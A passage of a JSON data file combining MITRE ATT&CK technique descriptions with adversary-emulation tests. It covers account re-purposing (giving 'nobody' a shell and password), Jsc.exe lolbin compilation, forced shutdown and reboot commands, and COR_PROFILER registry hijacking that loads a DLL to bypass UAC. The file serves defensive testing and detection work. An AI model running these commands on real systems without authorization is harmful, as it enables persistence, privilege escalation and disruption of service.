renew the account, su successfully, then delete the account.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": true, "command": "pw useradd art -g wheel -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user testuser1 -h 0\npw lock art\npw usermod art -e +1d\npw unlock art\npw user mod art -e +99d\nsu art\nwhoami\nexit\n", "cleanup_command": "rmuser -y art \n"}}, {"name": "Login as nobody (Linux)", "auto_generated_guid": "3d2cd093-ee05-41bd-a802-59ee5c301b85", "description": "An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "elevation_required": true, "command": "cat /etc/passwd |grep nobody \n# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nchsh --shell /bin/bash nobody\nusermod --password $(openssl passwd -1 nobody) nobody\nsu nobody\nwhoami\nexit\n", "cleanup_command": "chsh --shell /usr/sbin/nologin nobody\ncat /etc/passwd |grep nobody \n# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"}}, {"name": "Login as nobody (freebsd)", "auto_generated_guid": "16f6374f-7600-459a-9b16-6a88fd96d310", "description": "An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": true, "command": "cat /etc/passwd |grep nobody \n# -> nobody:x:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin\npw usermod nobody -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user nobody -h 0\nsu nobody\nwhoami\nexit\n", "cleanup_command": "pw usermod nobody -s /usr/sbin/nologin\ncat /etc/passwd |grep nobody\n# -> nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin\n"}}]}, "T1127": {"name": "Trusted Developer Utilities Proxy Execution", "technique_id": "attack-pattern--ff25900d-76d5-449b-a351-8824e62fc81b", "external_id": "T1127", "data_components": ["Process Creation", "Command Execution"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.", "atomic_tests": [{"name": "Lolbin Jsc.exe compile javascript to exe", "auto_generated_guid": "1ec1c269-d6bd-49e7-b71b-a461f7fa7bc8", "description": "Use jsc.exe to compile javascript code stored in scriptfile.js and output scriptfile.exe.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n", "supported_platforms": ["windows"], "input_arguments": {"filename": {"description": "Location of the project file", "type": "path", "default": "PathToAtomicsFolder\\T1127\\src\\hello.js"}, "jscpath": {"description": "Default location of jsc.exe", "type": "path", "default": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319"}, "jscname": {"description": "Default name of jsc", "type": "path", "default": "jsc.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "JavaScript code file must exist on disk at specified location (#{filename})\n", "prereq_command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127/src/hello.js\" -OutFile \"#{filename}\"\n"}], "executor": {"command": "copy \"#{filename}\" %TEMP%\\hello.js\n#{jscpath}\\#{jscname} %TEMP%\\hello.js\n", "cleanup_command": "del %TEMP%\\hello.js\ndel %TEMP%\\hello.exe\n", "name": "command_prompt"}}, {"name": "Lolbin Jsc.exe compile javascript to dll", "auto_generated_guid": "3fc9fea2-871d-414d-8ef6-02e85e322b80", "description": "Use jsc.exe to compile javascript code stored in Library.js and output Library.dll.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n", "supported_platforms": ["windows"], "input_arguments": {"filename": {"description": "Location of the project file", "type": "path", "default": "PathToAtomicsFolder\\T1127\\src\\LibHello.js"}, "jscpath": {"description": "Default location of jsc.exe", "type": "path", "default": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319"}, "jscname": {"description": "Default name of jsc", "type": "path", "default": "jsc.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "JavaScript code file must exist on disk at specified location (#{filename})\n", "prereq_command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127/src/LibHello.js\" -OutFile \"#{filename}\"\n"}], "executor": {"command": "copy \"#{filename}\" %TEMP%\\LibHello.js\n#{jscpath}\\#{jscname} /t:library %TEMP%\\LibHello.js\n", "cleanup_command": "del %TEMP%\\LibHello.js\ndel %TEMP%\\LibHello.dll\n", "name": "command_prompt"}}]}, "T1529": {"name": "System Shutdown/Reboot", "technique_id": "attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc", "external_id": "T1529", "data_components": ["Host Status", "Process Creation", "Command Execution"], "kill_chain_phases": ["impact"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A)\n\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)", "atomic_tests": [{"name": "Shutdown System - Windows", "auto_generated_guid": "ad254fa8-45c0-403b-8c77-e00b3d3e7a64", "description": "This test shuts down a Windows system.\n", "supported_platforms": ["windows"], "input_arguments": {"timeout": {"description": "Timeout period before shutdown (seconds)", "type": "integer", "default": 1}}, "executor": {"command": "shutdown /s /t #{timeout}\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Restart System - Windows", "auto_generated_guid": "f4648f0d-bf78-483c-bafc-3ec99cd1c302", "description": "This test restarts a Windows system.\n", "supported_platforms": ["windows"], "input_arguments": {"timeout": {"description": "Timeout period before restart (seconds)", "type": "integer", "default": 1}}, "executor": {"command": "shutdown /r /t #{timeout}\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Restart System via `shutdown` - FreeBSD/macOS/Linux", "auto_generated_guid": "6326dbc4-444b-4c04-88f4-27e94d0327cb", "description": "This test restarts a FreeBSD/macOS/Linux system.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"timeout": {"description": "Time to restart (can be minutes or specific time)", "type": "string", "default": "now"}}, "executor": {"command": "shutdown -r #{timeout}\n", "name": "sh", "elevation_required": true}}, {"name": "Shutdown System via `shutdown` - FreeBSD/macOS/Linux", "auto_generated_guid": "4963a81e-a3ad-4f02-adda-812343b351de", "description": "This test shuts down a FreeBSD/macOS/Linux system using a halt.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"timeout": {"description": "Time to shutdown (can be minutes or specific time)", "type": "string", "default": "now"}}, "executor": {"command": "shutdown -h #{timeout}\n", "name": "sh", "elevation_required": true}}, {"name": "Restart System via `reboot` - FreeBSD/macOS/Linux", "auto_generated_guid": "47d0b042-a918-40ab-8cf9-150ffe919027", "description": "This test restarts a FreeBSD/macOS/Linux system via `reboot`.\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "reboot\n", "name": "sh", "elevation_required": true}}, {"name": "Shutdown System via `halt` - FreeBSD/Linux", "auto_generated_guid": "918f70ab-e1ef-49ff-bc57-b27021df84dd", "description": "This test shuts down a FreeBSD/Linux system using `halt`.\n", "supported_platforms": ["linux"], "executor": {"command": "halt -p\n", "name": "sh", "elevation_required": true}}, {"name": "Reboot System via `halt` - FreeBSD", "auto_generated_guid": "7b1cee42-320f-4890-b056-d65c8b884ba5", "description": "This test restarts a FreeBSD system using `halt`.\n", "supported_platforms": ["linux"], "executor": {"command": "halt -r\n", "name": "sh", "elevation_required": true}}, {"name": "Reboot System via `halt` - Linux", "auto_generated_guid": "78f92e14-f1e9-4446-b3e9-f1b921f2459e", "description": "This test restarts a Linux system using `halt`.\n", "supported_platforms": ["linux"], "executor": {"command": "halt --reboot\n", "name": "bash", "elevation_required": true}}, {"name": "Shutdown System via `poweroff` - FreeBSD/Linux", "auto_generated_guid": "73a90cd2-48a2-4ac5-8594-2af35fa909fa", "description": "This test shuts down a FreeBSD/Linux system using `poweroff`.\n", "supported_platforms": ["linux"], "executor": {"command": "poweroff\n", "name": "sh", "elevation_required": true}}, {"name": "Reboot System via `poweroff` - FreeBSD", "auto_generated_guid": "5a282e50-86ff-438d-8cef-8ae01c9e62e1", "description": "This test restarts a FreeBSD system using `poweroff`.\n", "supported_platforms": ["linux"], "executor": {"command": "poweroff -r 3\n", "name": "sh", "elevation_required": true}}, {"name": "Reboot System via `poweroff` - Linux", "auto_generated_guid": "61303105-ff60-427b-999e-efb90b314e41", "description": "This test restarts a Linux system using `poweroff`.\n", "supported_platforms": ["linux"], "executor": {"command": "poweroff --reboot\n", "name": "bash", "elevation_required": true}}, {"name": "Logoff System - Windows", "auto_generated_guid": "3d8c25b5-7ff5-4c9d-b21f-85ebd06654a4", "description": "This test performs a Windows system logoff as seen in [dcrat backdoor capabilities](https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor)\n", "supported_platforms": ["windows"], "executor": {"command": "shutdown /l \n", "name": "command_prompt", "elevation_required": true}}]}, "T1574.012": {"name": "COR_PROFILER", "technique_id": "attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335", "external_id": "T1574.012", "data_components": ["Module Load", "Command Execution", "Process Creation", "Windows Registry Key Modification"], "kill_chain_phases": ["persistence", "privilege-escalation", "defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--a2c36a5d-4058-475e-8e77-fff75e50d3b9"], "description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)", "atomic_tests": [{"name": "User scope COR_PROFILER", "auto_generated_guid": "9d5f89dc-c3a5-4f8a-a4fc-a6ed02e7cb5a", "description": "Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).\nThe unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.\nAdditionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.\nIf the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,\nthe notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n", "supported_platforms": ["windows"], "input_arguments": {"file_name": {"description": "unmanaged profiler DLL", "type": "path", "default": "PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll"}, "clsid_guid": {"description": "custom clsid guid", "type": "string", "default": "{09108e71-974c-4010-89cb-acf471ae9e2c}"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "\"#{file_name}\" must be present\n", "prereq_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll\" -OutFile \"#{file_name}\"\n"}], "executor": {"command": "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\#{clsid_guid}\" -ForegroundColor Cyan\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\\InprocServer32\" -Value \"#{file_name}\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"#{file_name}\" -Force | Out-Null\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\nSTART MMC.EXE EVENTVWR.MSC\n", "cleanup_command": "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\" -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null\n", "name": "powershell"}}, {"name": "System Scope COR_PROFILER", "auto_generated_guid": "f373b482-48c8-4ce4-85ed-d40c8b3f7310", "description": "Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.\nThe unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity\nlevel of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will\nstill execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n", "supported_platforms": ["windows"], "input_arguments": {"file_name": {"description": "unmanaged profiler DLL", "type": "path", "default": "PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll"}, "clsid_guid": {"description": "custom clsid guid", "type": "string", "default": "{09108e71-974c-4010-89cb-acf471ae9e2c}"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "\"#{file_name}\" must be present\n", "prereq_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll\" -OutFile \"#{file_name}\"\n"}], "executor": {"command": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"#{file_name}\" -Force | Out-Null\n", "cleanup_command": "Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null\n", "name": "powershell", "elevation_required": true}}, {"name": "Registry-free process scope COR_PROFILER", "auto_generated_guid": "79d57242-bbef-41db-b301-9d01d9f6e817", "description": "Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n", "supported_platforms": ["windows"], "input_arguments": {"file_name": {"description": "unamanged profiler DLL", "type": "path", "default": "PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll"}, "clsid_guid": {"description": "custom clsid guid", "type": "string", "default": "{09108e71-974c-4010-89cb-acf471ae9e2c}"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "\"#{file_name}\" must be present\n", "prereq_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll\" -OutFile \"#{file_name}\"\n"}], "executor": {"command": "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '#{clsid_guid}'\n$env:COR_PROFILER_PATH = '\"#{file_name}\"'\nPOWERSHELL -c 'Start-Sleep 1'\n", "cleanup_command": "$env:COR_ENABLE_PROFILING = 0\n$env:COR_PROFILER = ''\n$env:COR_PROFILER_PATH = ''\n", "name": "powershell"}}]}}
